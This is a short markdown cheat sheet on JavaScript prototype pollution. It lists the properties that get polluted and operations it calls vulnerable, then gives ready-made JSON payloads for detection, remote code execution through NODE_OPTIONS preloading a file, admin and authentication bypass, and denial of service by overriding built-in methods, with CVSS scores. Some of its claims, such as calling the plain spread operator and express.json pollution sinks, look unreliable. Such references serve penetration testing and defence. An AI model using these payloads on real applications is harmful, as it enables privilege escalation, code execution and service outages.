# Prototype Pollution: Complete Reference

## Detection

### Common Polluted Properties
```javascript
// Server-side (Node.js)
__proto__
constructor.prototype
__proto__.isAdmin
constructor.prototype.isAdmin

// Payload patterns
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"__proto__": {"shell": "node"}}
```

### Vulnerable Operations
```javascript
// Object.assign
Object.assign({}, userInput)

// Lodash merge
_.merge({}, userInput)

// jQuery extend
$.extend(true, {}, userInput)

// Express body parsers
app.use(express.json())
app.use(bodyParser.json())

// Spread operator merge
{...userInput}
```

### Detection Payloads
```javascript
// Server crashes or shows different behavior
{"__proto__": {"a": "b"}}

// Check if prototype was modified
console.log({}.a)  // "b" if vulnerable

// DoS detection
{"__proto__": {"toString": "polluted"}}
```

## Exploitation

### RCE (Node.js)
```javascript
// Pollute to bypass shell checks
{"__proto__": {"shell": "node", "env": "production"}}

// Pollute child_process options
{"__proto__": {"NODE_OPTIONS": "--require /tmp/evil.js"}}

// Debugger injection
{"__proto__": {"NODE_DEBUG": "child_process"}}
```

### Auth Bypass
```javascript
// Pollute isAdmin to true
// Server code: if (user.isAdmin)
// After pollution: {}.isAdmin === true

{"__proto__": {"isAdmin": true}}
{"__proto__": {"role": "admin"}}
{"__proto__": {"authenticated": true}}
```

### Denial of Service
```javascript
// Override built-in methods
{"__proto__": {"toString": "bad"}}
{"__proto__": {"hasOwnProperty": "bad"}}
// Any code using these methods will crash
```

## CVSS Scoring
| Scenario | CVSS | Criteria |
|----------|------|---------|
| Prototype pollution -> RCE | 9.8 | Network, Low, No auth, Full impact |
| Prototype pollution -> auth bypass | 8.1 | Network, Low, No auth, All high |
| Prototype pollution -> DoS | 7.5 | Network, Low, No auth, Availability high |